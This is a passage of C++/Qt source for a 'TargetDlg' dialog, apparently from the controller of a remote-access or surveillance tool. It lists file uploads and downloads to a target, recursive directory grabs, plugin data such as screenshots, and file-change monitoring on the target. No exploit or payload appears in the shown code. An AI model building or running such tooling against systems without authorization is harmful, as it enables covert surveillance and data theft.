	if ( !this->bAppInfo )
	{
		m_appInfoDlg = new AppInfoDlg(this, tarBlock->m_sysType, tarBlock->widDiskDataDir);
		QHBoxLayout* layout = new QHBoxLayout(ui.frmAppInfo);
		layout->setContentsMargins(0, 0, 0, 0);
		layout->addWidget(m_appInfoDlg);

		connect(m_appInfoDlg, SIGNAL(emitGetAppData()), this, SLOT(GetAppData()));
		connect(m_appInfoDlg, SIGNAL(emitCleanData()), this, SLOT(CleanAppData()));
		connect(m_appInfoDlg, SIGNAL(emitExportData()), this, SLOT(ExportAppData()));
		bAppInfo = true;
	}
}

// ////////////////////////////////////////////////////////////////////////////////
// @private 初始化第三方插件管理
//
void TargetDlg::InitThirdPlugin()
{
	if ( !this->bThirdPlugin )
	{
		m_thirdPluginDlg = new ThirdPluginDlg(this->tarBlock);
		QHBoxLayout* layout = new QHBoxLayout(ui.frmThirdPlugin);
		layout->addWidget(m_thirdPluginDlg);
		bThirdPlugin = true;
	}
}

// ////////////////////////////////////////////////////////////////////////////////
// @private 获取当前任务列表
//
QTableWidget* TargetDlg::GetActiveFTListView()
{
	QTableWidget* table = NULL;

	switch ( ui.stkMissionStatus->currentIndex() )
	{

	case 0:
		table = ui.tbUploadFileList;
		break;

	case 1:
		table = ui.tbDownloadFileList;
		break;

	case 2:
		if ( ui.tbDirCommand->selectedItems().count() > 0 )
		{
			table = ui.tbDirCommand;
		}
		else
		{
			table = ui.tbFileCommand;
		}
		break;

	case 3:
		table = ui.tbDirInfoList;
		break;

	case 4:
		table = ui.tbUploadPluginList;
		break;

	case 5:
		table = ui.tbPluginData;
		break;
	}

	return table;
}

// ////////////////////////////////////////////////////////////////////////////////
// @private 添加任务至列表
//
void TargetDlg::AddFileTaskToListView(FileTask *fileTask)
{
	QTableWidgetItem* item = NULL;
	QTableWidgetItem* parItem = NULL;

	switch(fileTask->taskType)
	{
	case TASK_FILEDATA:

		// 文件上传
		if (fileTask->taskDirect == FILEUP)
		{
			item = AddFileDataTaskToListView(fileTask, ui.tbUploadFileList);
		}
		// 下载
		else
		{
			item = AddFileDataTaskToListView(fileTask, ui.tbDownloadFileList);
		}
		break;

    case TASK_PLUGINDATA:
        item = AddPluginDataTaskToListView(fileTask);
        break;
		//
		//    case TASK_PLUGINUPT:
		//        li = AddPluginUptTaskToListView(fileTask);
		//        break;
		//
		//    case TASK_SEARCHINFO:
		//        // 对于异步搜索，FildTask和DirTask同用一个ListItem
		//        // 所以这时不用另外再添加，只是进行状态更新即可
		//        //
		//        li = QueryFileTaskListItem(fileTask, NULL, NULL);
		//        if (li)
		//        {
		//            li->SubItems->Strings[3] = WideString(fileTask->dwTotalLen);
		//        }
		//        return;
		//                
	case TASK_DIRINFO:
		// 对于多层目录信息获取，FileTask和DirTask同用一个ListItem
		// 所以这时不用另外再添加，只是进行状态更新即可
		//
		item = QueryFileTaskListItem(fileTask, NULL, NULL);
		if (item)
		{
			item->tableWidget()->item(item->row(), 4)->setText(QString("%1").arg(fileTask->dwTotalLen));
		}
		return;

	case TASK_DIRFILE:

		{
			// 只有目录指令选中，且是其父指令，才会添加到ListView上
			//
			QList<QTableWidgetItem*> items = ui.tbDirCommand->selectedItems();

			if ( 0 != items.count() )
			{
				parItem = ui.tbDirCommand->item(items.at(0)->row(), 0);

				PDirTask lpDirTask = (PDirTask)parItem->data(Qt::UserRole).toUInt();
				if (lpDirTask->dwTaskID == fileTask->dwParentID)
				{   
					item = AddFileDataTaskToListView(fileTask, ui.tbFileCommand);                
				}
			}
		}
		break;

	case TASK_PLUGINUPT:
		item = AddPluginUptTaskToListView(fileTask);
		break;

	default:
		break;
	}

	if (item == NULL)
	{
		return;
	}

	item->setData(Qt::UserRole, (unsigned int)fileTask);

	return;
}

// ////////////////////////////////////////////////////////////////////////////////
// @private 添加文件任务至列表
//
QTableWidgetItem* TargetDlg::AddFileDataTaskToListView(FileTask *fileTask, QTableWidget* list)
{
	QTableWidgetItem* status = new QTableWidgetItem;
	QTableWidgetItem* id = new QTableWidgetItem;
	QTableWidgetItem* fileName = new QTableWidgetItem;
	QTableWidgetItem* localPath = new QTableWidgetItem;
	QTableWidgetItem* targetPath = new QTableWidgetItem;
	QTableWidgetItem* totalLen = new QTableWidgetItem;
	QTableWidgetItem* daeProgress = new QTableWidgetItem;
	QTableWidgetItem* progress = new QTableWidgetItem;
	QTableWidgetItem* remark = new QTableWidgetItem;

	status->setTextAlignment(Qt::AlignCenter);
	id->setTextAlignment(Qt::AlignCenter);
	targetPath->setTextAlignment(Qt::AlignLeft | Qt::AlignVCenter);
	//fileName->setTextAlignment(Qt::AlignCenter);
	totalLen->setTextAlignment(Qt::AlignCenter);
	daeProgress->setTextAlignment(Qt::AlignCenter);
	progress->setTextAlignment(Qt::AlignCenter);
	remark->setTextAlignment(Qt::AlignCenter);

	status->setText(QString::fromStdWString(ConvertTaskStatusToLangW((TaskStatus)fileTask->taskStatus)));
	id->setText(QString("%1").arg(fileTask->dwTaskID));

	if (fileTask->taskDirect == FILEUP)
	{
		fileName->setText(QString::fromStdWString(ExtractFileNameW(fileTask->ctrPathW.c_str())));
		localPath->setText(QString::fromStdWString(fileTask->ctrPathW));
		targetPath->setText(QString::fromStdWString(fileTask->tarPathW));
	}
	else
	{
		/*if ( this->tarBlock->m_isMac )
		{
			targetPath->setText(QString::fromStdWString(ExtractFileNameMac(fileTask->tarPathW.c_str())));
		}
		else
		{
			targetPath->setText(QString::fromStdWString(ExtractFileNameW(fileTask->tarPathW.c_str())));
		}*/

		targetPath->setText(QString::fromStdWString(fileTask->tarPathW.c_str()));

		if (wcscmp(fileTask->ctrPathW.c_str(), L"..") == 0)
		{
			localPath->setText(QString::fromLocal8Bit("本地数据仿真目录"));
		}
		else
		{
			localPath->setText(QString::fromStdWString(fileTask->ctrPathW));
		}
	}

	totalLen->setText(QString("%1").arg(fileTask->dwTotalLen));

	if (0 != fileTask->dwTotalLen)
	{
		progress->setText(QString("%1%").arg(fileTask->nFinishedProp));
		daeProgress->setText(QString("%1%").arg(fileTask->nDaemonedProp));
	}
	else
	{
		if (fileTask->taskStatus == FINISHED)
		{
			progress->setText("100%");
			daeProgress->setText("100%");
		}
		else
		{
			progress->setText("0%");
			daeProgress->setText("0%");
		}
	}

	if (fileTask->dwErrorID)
	{
		remark->setText(QString::fromStdWString(ConvertErrorIdToStrW(fileTask->dwErrorID)));
	}
	else
	{
		remark->setText("");
	}

	int insertRow = 0;
	//if ( list == ui.tbFileCommand )
	//{
		insertRow = list->rowCount();
	//}

	list->insertRow(insertRow);

	if (fileTask->taskDirect == FILEUP)
	{
		list->setItem(insertRow, 0, status);
		list->setItem(insertRow, 1, id);
		list->setItem(insertRow, 2, fileName);
		list->setItem(insertRow, 3, localPath);
		list->setItem(insertRow, 4, targetPath);
		list->setItem(insertRow, 5, totalLen);
		list->setItem(insertRow, 6, progress);
		list->setItem(insertRow, 7, remark);
	}
	else
	{
		list->setItem(insertRow, 0, status);
		list->setItem(insertRow, 1, id);
		list->setItem(insertRow, 2, targetPath);
		list->setItem(insertRow, 3, localPath);
		list->setItem(insertRow, 4, totalLen);
		list->setItem(insertRow, 5, daeProgress);
		list->setItem(insertRow, 6, progress);
		list->setItem(insertRow, 7, remark);
	}

	return status;
}

// ////////////////////////////////////////////////////////////////////////////////
// @private 查询文件任务所对应的 item
//
QTableWidgetItem* TargetDlg::QueryFileTaskListItem(FileTask *fileTask, int* lpnDaeIndex,int* lpnFinIndex)
{
	QTableWidget* table = NULL;

	if (lpnFinIndex)
	{
		*lpnFinIndex = 6;
		*lpnDaeIndex = 5;

		if (fileTask->taskType == TASK_PLUGINUPT)
		{
			*lpnFinIndex = 5;
			*lpnDaeIndex = 4;
		}
		else if (fileTask->taskType == TASK_PLUGINDATA)
		{
			*lpnFinIndex = 7;
			*lpnDaeIndex = 6;
		}
		else if (fileTask->taskType == TASK_FILEDATA)
		{
			if (fileTask->taskDirect == FILEUP)
			{
				*lpnFinIndex = 7;
				*lpnDaeIndex = 6;
			}
			else
			{
				*lpnFinIndex = 6;
				*lpnDaeIndex = 5;
			}
		}
		else if (fileTask->taskType == TASK_DIRINFO)
		{
			*lpnFinIndex = 6;
			*lpnDaeIndex = 5;
		}
	}

	switch(fileTask->taskType)
	{
	case TASK_FILEDATA:
		if (fileTask->taskDirect == FILEUP)
		{
			table = ui.tbUploadFileList;
		}
		else
		{
			table = ui.tbDownloadFileList;
		}
		break;
	case TASK_PLUGINDATA:
		table = ui.tbPluginData;
		break;
	case TASK_PLUGINUPT:
		table = ui.tbUploadPluginList;
		break;
	case TASK_DIRINFO:
		table = ui.tbDirInfoList;
		break;
	case TASK_DIRFILE:
		table = ui.tbFileCommand;
		break;
		//case TASK_SEARCHINFO:
		//tntlv = this->tntlvSearchData;
		//break;
	default:
		break;
	}

	int i = 0;
	QTableWidgetItem* item = NULL;

	// 对于TASK_DIRFILE是最特殊的，首先需要检查tntlvDirDown
	//
	if (fileTask->taskType == TASK_DIRFILE)
	{
		QList<QTableWidgetItem*> items = ui.tbDirCommand->selectedItems();

		if ( 0 == items.count() )
		{
			return NULL;
		}

		QTableWidgetItem* item = ui.tbDirCommand->item(items.at(0)->row(), 0);
		DirTask *lpDirTask = (PDirTask)item->data(Qt::UserRole).toUInt();
		if (lpDirTask->dwTaskID != fileTask->dwParentID)
		{
			return NULL;
		}
	}

	i = 0;

	if ( NULL == table )
		return NULL;

	for (; i < table->rowCount(); i++)
	{
		item = table->item(i, 1);

		// 多层目录信息获取和远程搜索是特殊的
		//
		if (fileTask->taskType == TASK_DIRINFO)
		{
			DirTask *lpDirTask = (PDirTask)item->data(Qt::UserRole).toUInt();
			if (lpDirTask)
			{
				if (fileTask->dwParentID == lpDirTask->dwTaskID)
				{
					break;
				}
			}
		}
		else if (fileTask->taskType == TASK_SEARCHINFO)
		{
			SearchTask *lpSearchTask = (PSearchTask)item->data(Qt::UserRole).toUInt();
			if (lpSearchTask)
			{
				if (fileTask->dwParentID == lpSearchTask->dwTaskID)
				{
					break;
				}
			}
		}
		else
		{
			// 此处改为根据 taskId 判断
			if (fileTask->dwTaskID == item->text().toUInt())
			{
				break;
			}
		}
	}

	if ( i == table->rowCount() )
	{ 
		return NULL;
	}

	return item;
}

// ////////////////////////////////////////////////////////////////////////////////
// @private 添加目录任务至列表
//
void TargetDlg::AddDirTaskToListView(DirTask *dirTask)
{

	if (dirTask->dwAutoDown == 0)
	{
		AddDirInfoTaskToListView(dirTask);
	}
	else
	{
		AddDirDownTaskToListView(dirTask);
	}
}

// ////////////////////////////////////////////////////////////////////////////////
// @private 添加目录信息获取任务至列表
//
QTableWidgetItem* TargetDlg::AddDirInfoTaskToListView(DirTask *dirTask)
{
	QTableWidgetItem* status = new QTableWidgetItem;
	QTableWidgetItem* id = new QTableWidgetItem;
	QTableWidgetItem* tarDirPath = new QTableWidgetItem;
	QTableWidgetItem* level = new QTableWidgetItem;
	QTableWidgetItem* totalLen = new QTableWidgetItem;
	QTableWidgetItem* progress = new QTableWidgetItem;
	QTableWidgetItem* remark = new QTableWidgetItem;

	status->setTextAlignment(Qt::AlignCenter);
	id->setTextAlignment(Qt::AlignCenter);
	//tarDirPath->setTextAlignment(Qt::AlignCenter);
	level->setTextAlignment(Qt::AlignCenter);
	totalLen->setTextAlignment(Qt::AlignCenter);
	progress->setTextAlignment(Qt::AlignCenter);
	remark->setTextAlignment(Qt::AlignCenter);

	status->setText(QString::fromStdWString(ConvertTaskStatusToLangW((TaskStatus)dirTask->taskStatus)));
	id->setText(QString("%1").arg(dirTask->dwTaskID));
	tarDirPath->setText(QString::fromStdWString(dirTask->tarDirPathW));

	if (dirTask->dwLevel == 0)
	{
		level->setText(QString::fromLocal8Bit("全部"));
	}
	else
	{
		level->setText(QString("%1").arg(dirTask->dwLevel));
	}

	PFileTask lpFileTask = dirTask->lpInfoFileTask;
	if (lpFileTask == NULL)
	{
		totalLen->setText("");
		progress->setText("");
	}
	else
	{
		totalLen->setText(QString("%1").arg(lpFileTask->dwTotalLen));
		progress->setText(QString("%1%").arg(lpFileTask->nFinishedProp));
	}

	if (dirTask->dwErrorID > 0)
	{
		remark->setText(QString::fromStdWString(ConvertErrorIdToStrW(dirTask->dwErrorID)));
	}
	else
	{
		remark->setText("");
	}

	status->setData(Qt::UserRole, (unsigned int)dirTask);

	ui.tbDirInfoList->insertRow(0);
	ui.tbDirInfoList->setItem(0, 0, status);
	ui.tbDirInfoList->setItem(0, 1, id);
	ui.tbDirInfoList->setItem(0, 2, tarDirPath);
	ui.tbDirInfoList->setItem(0, 3, level);
	ui.tbDirInfoList->setItem(0, 4, totalLen);
	ui.tbDirInfoList->setItem(0, 5, progress);
	ui.tbDirInfoList->setItem(0, 6, remark);

	return status;
}

// ////////////////////////////////////////////////////////////////////////////////
// @private 添加目录下载任务至列表
//
QTableWidgetItem* TargetDlg::AddDirDownTaskToListView(DirTask *dirTask)
{
	QTableWidgetItem* status = new QTableWidgetItem;
	QTableWidgetItem* id = new QTableWidgetItem;
	QTableWidgetItem* tarDirPath = new QTableWidgetItem;
	QTableWidgetItem* level = new QTableWidgetItem;
	QTableWidgetItem* running = new QTableWidgetItem;
	QTableWidgetItem* paused = new QTableWidgetItem;
	QTableWidgetItem* finished = new QTableWidgetItem;
	QTableWidgetItem* canceled = new QTableWidgetItem;
	QTableWidgetItem* failed = new QTableWidgetItem;
	QTableWidgetItem* remark = new QTableWidgetItem;

	status->setTextAlignment(Qt::AlignCenter);
	id->setTextAlignment(Qt::AlignCenter);
	//tarDirPath->setTextAlignment(Qt::AlignCenter);
	level->setTextAlignment(Qt::AlignCenter);
	running->setTextAlignment(Qt::AlignCenter);
	paused->setTextAlignment(Qt::AlignCenter);
	finished->setTextAlignment(Qt::AlignCenter);
	canceled->setTextAlignment(Qt::AlignCenter);
	failed->setTextAlignment(Qt::AlignCenter);
	remark->setTextAlignment(Qt::AlignCenter);

	status->setText(QString::fromStdWString(ConvertTaskStatusToLangW((TaskStatus)dirTask->taskStatus)));
	id->setText(QString("%1").arg(dirTask->dwTaskID));
	tarDirPath->setText(QString::fromStdWString(dirTask->tarDirPathW));

	if (dirTask->dwLevel == 0)
	{
		level->setText(QString::fromLocal8Bit("全部"));
	}
	else
	{
		level->setText(QString("%1").arg(dirTask->dwLevel));
	}

	running->setText(QString("%1").arg(dirTask->dwWorkingCount));
	paused->setText(QString("%1").arg(dirTask->dwPausedCount));
	finished->setText(QString("%1").arg(dirTask->dwFinishedCount));
	canceled->setText(QString("%1").arg(dirTask->dwCanceledCount));
	failed->setText(QString("%1").arg(dirTask->dwErroredCount));

	if (dirTask->dwErrorID)
	{
		remark->setText(QString::fromStdWString(ConvertErrorIdToStrW(dirTask->dwErrorID)));
	}
	else
	{
		remark->setText("");
	}

	status->setData(Qt::UserRole, (unsigned int)dirTask);

	ui.tbDirCommand->insertRow(0);

	ui.tbDirCommand->setItem(0, 0, status);
	ui.tbDirCommand->setItem(0, 1, id);
	ui.tbDirCommand->setItem(0, 2, tarDirPath);
	ui.tbDirCommand->setItem(0, 3, level);
	ui.tbDirCommand->setItem(0, 4, running);
	ui.tbDirCommand->setItem(0, 5, paused);
	ui.tbDirCommand->setItem(0, 6, finished);
	ui.tbDirCommand->setItem(0, 7, canceled);
	ui.tbDirCommand->setItem(0, 8, failed);
	ui.tbDirCommand->setItem(0, 9, remark);

	return status;
}

// ////////////////////////////////////////////////////////////////////////////////
// @private 添加插件数据回传任务至列表
//
QTableWidgetItem* TargetDlg::AddPluginDataTaskToListView(FileTask* fileTask)
{
	QTableWidgetItem* status = new QTableWidgetItem;
	QTableWidgetItem* taskId = new QTableWidgetItem;
	QTableWidgetItem* pluginId = new QTableWidgetItem;
	QTableWidgetItem* pluginName = new QTableWidgetItem;
	QTableWidgetItem* tarPath = new QTableWidgetItem;
	QTableWidgetItem* len = new QTableWidgetItem;
	QTableWidgetItem* progress = new QTableWidgetItem;
	QTableWidgetItem* remark = new QTableWidgetItem;

	status->setTextAlignment(Qt::AlignCenter);
	taskId->setTextAlignment(Qt::AlignCenter);
	pluginId->setTextAlignment(Qt::AlignCenter);
	pluginName->setTextAlignment(Qt::AlignCenter);
	//tarPath->setTextAlignment(Qt::AlignCenter);
	len->setTextAlignment(Qt::AlignCenter);
	progress->setTextAlignment(Qt::AlignCenter);
	remark->setTextAlignment(Qt::AlignCenter);

	status->setText(QString::fromStdWString(ConvertTaskStatusToLangW((TaskStatus)fileTask->taskStatus)));
	taskId->setText(tr("%1").arg(fileTask->dwTaskID));
	pluginId->setText(tr("%1").arg(fileTask->dwPluginID));
	pluginName->setText(QString::fromStdWString(ConvertPluginIdToLangW(fileTask->dwPluginID)));
	tarPath->setText(QString::fromStdWString(fileTask->tarPathW));
	len->setText(tr("%1").arg(fileTask->dwTotalLen));
	progress->setText("0%");

	if ( fileTask->dwErrorID )
	{
		remark->setText(QString::fromStdWString(ConvertErrorIdToStrW(fileTask->dwErrorID)));
	}

	int row = ui.tbPluginData->rowCount();
	ui.tbPluginData->insertRow(row);
	ui.tbPluginData->setItem(row, 0, status);
	ui.tbPluginData->setItem(row, 1, taskId);
	ui.tbPluginData->setItem(row, 2, pluginId);
	ui.tbPluginData->setItem(row, 3, pluginName);
	ui.tbPluginData->setItem(row, 4, tarPath);
	ui.tbPluginData->setItem(row, 5, len);
	ui.tbPluginData->setItem(row, 6, progress);
	ui.tbPluginData->setItem(row, 7, remark);

	return status;
}

// ////////////////////////////////////////////////////////////////////////////////
// @private 添加插件升级任务至列表
//
QTableWidgetItem* TargetDlg::AddPluginUptTaskToListView(FileTask* fileTask)
{
	QTableWidgetItem* status = new QTableWidgetItem;
	QTableWidgetItem* taskId = new QTableWidgetItem;
	QTableWidgetItem* pluginId = new QTableWidgetItem;
	QTableWidgetItem* len = new QTableWidgetItem;
	QTableWidgetItem* progress = new QTableWidgetItem;
	QTableWidgetItem* remark = new QTableWidgetItem;

	status->setTextAlignment(Qt::AlignCenter);
	taskId->setTextAlignment(Qt::AlignCenter);
	pluginId->setTextAlignment(Qt::AlignCenter);
	len->setTextAlignment(Qt::AlignCenter);
	progress->setTextAlignment(Qt::AlignCenter);
	remark->setTextAlignment(Qt::AlignCenter);

	status->setText(QString::fromStdWString(ConvertTaskStatusToLangW((TaskStatus)fileTask->taskStatus)));
	taskId->setText(tr("%1").arg(fileTask->dwTaskID));
	pluginId->setText(tr("%1").arg(fileTask->dwPluginID));
	len->setText(tr("%1").arg(fileTask->dwTotalLen));
	progress->setText("0%");

	if ( fileTask->dwErrorID )
	{
		remark->setText(QString::fromStdWString(ConvertErrorIdToStrW(fileTask->dwErrorID)));
	}

	int row = ui.tbUploadPluginList->rowCount();
	ui.tbUploadPluginList->insertRow(row);
	ui.tbUploadPluginList->setItem(row, 0, status);
	ui.tbUploadPluginList->setItem(row, 1, taskId);
	ui.tbUploadPluginList->setItem(row, 2, pluginId);
	ui.tbUploadPluginList->setItem(row, 3, len);
	ui.tbUploadPluginList->setItem(row, 4, progress);
	ui.tbUploadPluginList->setItem(row, 5, remark);

	return status;
}


// ////////////////////////////////////////////////////////////////////////////////
// @private 添加搜索任务至列表
//
void TargetDlg::AddSearchTaskToListView(SearchTask *searchTask)
{

}

// ////////////////////////////////////////////////////////////////////////////////
// @private 添加根文件至文件监控列表
//
/*void TargetDlg::AddRootItemToFileStatusList(std::wstring path)
{
	QTableWidgetItem* item = ui.tbFileList->selectedItems()[0];
	item = ui.tbFileList->item(item->row(), 0);

	PFILE_BLOCK fileInfo = (PFILE_BLOCK)item->data(Qt::UserRole).toUInt();

	// 添加 "已监视" 的标记
	// 第一列已被占用，故使用第二列的 data
	QTableWidgetItem* container = ui.tbFileList->item(item->row(), 1);
	container->setData(Qt::UserRole, MONITORING);

	QTreeWidgetItem* monitorItem = new QTreeWidgetItem;

	//
	// 文件名
	//
	monitorItem->setText(0, QString::fromStdWString(fileInfo->widName));

	//
	// 路径
	//
	monitorItem->setText(1, QString::fromStdWString(path));

	//
	// 图标
	//

	if (fileInfo->FileAttributes & FILE_ATTRIBUTE_DIRECTORY)
	{
		QFileIconProvider provider;
		monitorItem->setIcon(0, provider.icon(QFileIconProvider::Folder));
	}
	else
	{
		HICON hIcon = GetIconFromFileName(fileInfo->widName.c_str());

		monitorItem->setIcon(0, QIcon(QPixmap::fromWinHICON(hIcon)));  
		DestroyIcon(hIcon);
	}

	// 类型
	if ( fileInfo->FileAttributes & FILE_ATTRIBUTE_DIRECTORY )
	{
		monitorItem->setText(
			3, QString::fromStdWString(m_curMonitorType == L"*.*" ? L"所有文件" : m_curMonitorType));
	}

	// 时间
	SYSTEMTIME  systime;
	FILETIME    local;
	FileTimeToLocalFileTime((FILETIME*)&fileInfo->LastWriteTime, &local);
	FileTimeToSystemTime(&local,&systime);
	char time[MAX_PATH] = {0};
	sprintf(time, "%.4d-%.2d-%.2d %.2d:%.2d", systime.wYear,systime.wMonth,
		systime.wDay ,systime.wHour ,systime.wMinute);
	monitorItem->setText(2, QString::fromLocal8Bit(time));

	// 标记是文件夹还是文件
	monitorItem->setData(0, Qt::UserRole, (unsigned int)fileInfo->FileAttributes);

	// 插入至数据库
	DM->InsertFileMonitorList(
		this->tarBlock->dwTargetID,
		monitorItem->text(0).toStdWString(),
		monitorItem->text(1).toStdWString(),
		monitorItem->text(2).toStdWString(),
		monitorItem->text(3).toStdWString(),
		fileInfo->FileAttributes);

	ui.trFileStatus->addTopLevelItem(monitorItem);
}

// ////////////////////////////////////////////////////////////////////////////////
// @private 添加根文件记录
//
void TargetDlg::AddRootItemRecordToFileStatusList(std::wstring path, LONGLONG time)
{
	QTreeWidgetItem* root = NULL;

	for (int i = 0; i < ui.trFileStatus->topLevelItemCount(); i++)
	{
		QTreeWidgetItem* item = ui.trFileStatus->topLevelItem(i);
		if ( item->text(1).toStdWString() == path )
		{
			root = item;
			break;
		}
	}

	if ( NULL != root )
	{
		QTreeWidgetItem* newRecord = new QTreeWidgetItem;
		WCHAR wzRecordCount[MAX_PATH] = {0};
		wsprintf(wzRecordCount, L"第 %d 次修改", root->childCount()+1);
		newRecord->setText(0, QString::fromStdWString(std::wstring(wzRecordCount)));
		newRecord->setText(1, QString::fromStdWString(path));

		SYSTEMTIME  systime;
		FILETIME    local;
		FileTimeToLocalFileTime((FILETIME*)&time, &local);
		FileTimeToSystemTime(&local,&systime);
		char time[MAX_PATH] = {0};
		sprintf(time, "%.4d-%.2d-%.2d %.2d:%.2d", systime.wYear,systime.wMonth,
			systime.wDay ,systime.wHour ,systime.wMinute);

		newRecord->setText(2, QString::fromLocal8Bit(time));

		root->addChild(newRecord);

		// 插入至数据库
		DM->InsertFileMonitorRecord(this->tarBlock->dwTargetID,
			newRecord->text(0).toStdWString(),
			newRecord->text(1).toStdWString(),
			newRecord->text(2).toStdWString()
			);
	}
}

// ////////////////////////////////////////////////////////////////////////////////
// @private 添加子文件记录
//
void TargetDlg::AddSubItemRecordToFileStatusList(std::wstring path, LONGLONG time)
{
	QTreeWidgetItem* root = NULL;

	// 查找所在文件夹
	for (int i = 0; i < ui.trFileStatus->topLevelItemCount(); i++)
	{
		QTreeWidgetItem* item = ui.trFileStatus->topLevelItem(i);

		if ( item->data(0, Qt::UserRole).toUInt() & FILE_ATTRIBUTE_DIRECTORY )
		{
			std::wstring dirPath = item->text(1).toStdWString();
			if ( FileInDir(path, dirPath) )
			{
				root = item;
				break;
			}
		}
	}

	if ( NULL == root )
	{
		return;
	}

	//
	// 添加记录
	//

	// 先查找是否已经存在
	QTreeWidgetItem* sameItem = NULL;
	for (int i = 0; i < root->childCount(); i++)
	{
		QTreeWidgetItem* item = root->child(i);

		if ( item->text(1).toStdWString() == path )
		{
			sameItem = item;
			break;
		}
	}

	// 找到了则添加记录，没找到则添加新节点
	if ( NULL != sameItem )
	{
		QTreeWidgetItem* newRecord = new QTreeWidgetItem;
		WCHAR wzRecordCount[MAX_PATH] = {0};
		wsprintf(wzRecordCount, L"第 %d 次修改", sameItem->childCount()+1);
		newRecord->setText(0, QString::fromStdWString(std::wstring(wzRecordCount)));
		
		newRecord->setText(1, QString::fromStdWString(path));

		SYSTEMTIME  systime;
		FILETIME    local;
		FileTimeToLocalFileTime((FILETIME*)&time, &local);
		FileTimeToSystemTime(&local,&systime);
		char time[MAX_PATH] = {0};
		sprintf(time, "%.4d-%.2d-%.2d %.2d:%.2d", systime.wYear,systime.wMonth,
			systime.wDay ,systime.wHour ,systime.wMinute);

		newRecord->setText(2, QString::fromLocal8Bit(time));

		sameItem->addChild(newRecord);

		// 添加记录
		DM->InsertFileMonitorRecord(this->tarBlock->dwTargetID,
			newRecord->text(0).toStdWString(),
			newRecord->text(1).toStdWString(),
			newRecord->text(2).toStdWString());
	}
	else
	{
		QTreeWidgetItem* newItem = new QTreeWidgetItem;
		std::wstring name = UnixLike(tarBlock) ? GetNameFromPath(path, L'/') : GetNameFromPath(path, L'\\');
		newItem->setText(0, QString::fromStdWString(name));
		HICON hIcon = GetIconFromFileName(path.c_str());
		newItem->setIcon(0, QIcon(QPixmap::fromWinHICON(hIcon)));
		DestroyIcon(hIcon);

		newItem->setText(1, QString::fromStdWString(path));

		SYSTEMTIME  systime;
		FILETIME    local;
		FileTimeToLocalFileTime((FILETIME*)&time, &local);
		FileTimeToSystemTime(&local,&systime);
		char time[MAX_PATH] = {0};
		sprintf(time, "%.4d-%.2d-%.2d %.2d:%.2d", systime.wYear,systime.wMonth,
			systime.wDay ,systime.wHour ,systime.wMinute);

		newItem->setText(2, QString::fromLocal8Bit(time));

		root->addChild(newItem);

		// 添加新节点
		DM->InsertFileMonitorList(this->tarBlock->dwTargetID,
			newItem->text(0).toStdWString(),
			newItem->text(1).toStdWString(),
			newItem->text(2).toStdWString(),
			L"",
			0);
	}
}*/

// ////////////////////////////////////////////////////////////////////////////////
// @private 设置状态栏消息
//
void TargetDlg::on_WM_SET_TAR_STATUSINFO_W(MSG* msg)
{
	STATUS_LEVEL sl = (STATUS_LEVEL)msg->wParam;
	wchar_t *lpwzInfo = (wchar_t *)msg->lParam;

	wchar_t *lpPartInfo = wcschr(lpwzInfo, L']');
	if (lpPartInfo)
	{
		lpPartInfo++;
	}
	else
	{
		lpPartInfo = lpwzInfo;
	}

	ui.lbStatusBar->setText(QString::fromStdWString(std::wstring(lpPartInfo)));

	if ( !this->bLogInfo )
		return;

	m_logDetailDlg->AddDetail(lpPartInfo);
}

// ////////////////////////////////////////////////////////////////////////////////
// @private 新的文件任务
//
void TargetDlg::on_WM_NEW_FILETASK(MSG* msg)
{
	FileTask *fileTask = (FileTask *)msg->wParam;
	AddFileTaskToListView(fileTask);
}

// ////////////////////////////////////////////////////////////////////////////////
// @private 更新文件任务状态
//
void TargetDlg::on_WM_UPT_FILETASK_STATUS(MSG* msg)
{
	FileTask *fileTask = (FileTask *)msg->wParam;

	// 对于多层目录信息，其ListItem状态的更新是由DTK来完成的
	//

	if (fileTask->taskType == TASK_DIRINFO )
	{
		// DO Nothing
		//
		return;
	}

	int nDaeIndex, nFinishIndex;
	QTableWidgetItem* item = QueryFileTaskListItem(fileTask, &nDaeIndex, &nFinishIndex);
	if ( item )
	{
		if (nFinishIndex != -1)
		{
			if (fileTask->dwTotalLen > 0)
			{
				fileTask->nFinishedProp = (int)((double)fileTask->dwFinishedLen /(double)fileTask->dwTotalLen * 100);
				QTableWidgetItem* progress = item->tableWidget()->item(item->row(), nFinishIndex);
				progress->setText(QString("%1%").arg(fileTask->nFinishedProp));
			}
		}

		QTableWidgetItem* status = item->tableWidget()->item(item->row(), 0);
		QTableWidgetItem* remark = item->tableWidget()->item(
			item->row(), nFinishIndex + 1);

		switch(fileTask->taskStatus)
		{
		case WORKING:
			status->setText(QString::fromLocal8Bit("进行"));
			break;
		case PAUSED:
			status->setText(QString::fromLocal8Bit("暂停"));
			break;

		case PAUSEDBYNET:
			status->setText(QString::fromLocal8Bit("暂停"));
			if ( remark )
				remark->setText(QString::fromLocal8Bit("因网络状态切换导致该任务暂停"));
			break;

		case ERRORED:
			if ( status )
				status->setText(QString::fromLocal8Bit("出错"));
			if ( remark && fileTask )
				remark->setText(QString::fromStdWString(ConvertErrorIdToStrW(fileTask->dwErrorID)));

			status->setData(Qt::UserRole, NULL);
			break;

		case CANCELED:
			status->setText(QString::fromLocal8Bit("取消"));
			status->setData(Qt::UserRole, NULL);
			if ( remark )
				remark->setText("");
			break;
		case FINISHED:
			status->setText(QString::fromLocal8Bit("完成"));
			status->setData(Qt::UserRole, NULL);
			if ( remark )
				remark->setText("");
			break;
		}
	}
}

// ////////////////////////////////////////////////////////////////////////////////
// @private 更新文件任务进度
//
void TargetDlg::on_WM_UPT_FILETASK_PROGRESS(MSG* msg)
{
	FileTask *fileTask = (FileTask *)msg->wParam;

	if (FrmMain->bClosing)
	{
		return;
	}

	// @@ 截屏进度不做处理
	/*if (fileTask->taskType == TASK_PLUGINDATA )
	{
		// DO Nothing
		//
		return;
	}*/

	// @@NOTE: 这里多层目录信息获取的进度更新也是通用的
	//
	int nDaeIndex, nFinishIndex;

	QTableWidgetItem* item = QueryFileTaskListItem(fileTask, &nDaeIndex, &nFinishIndex);

	if ( item )
	{

		if (nFinishIndex != -1)
		{
			if (fileTask->dwTotalLen > 0)
			{
				int nFinishedProp = (int)((double)fileTask->dwFinishedLen /(double)fileTask->dwTotalLen * 100);
				int nDaemonProp = (int)((double)fileTask->dwDaemonedLen /(double)fileTask->dwTotalLen * 100);
				if (nFinishedProp != fileTask->nFinishedProp
					|| nDaemonProp != fileTask->nDaemonedProp )
				{
					fileTask->nFinishedProp = nFinishedProp;
					fileTask->nDaemonedProp = nDaemonProp;
					QTableWidgetItem* progress = item->tableWidget()->item(item->row(), nFinishIndex);
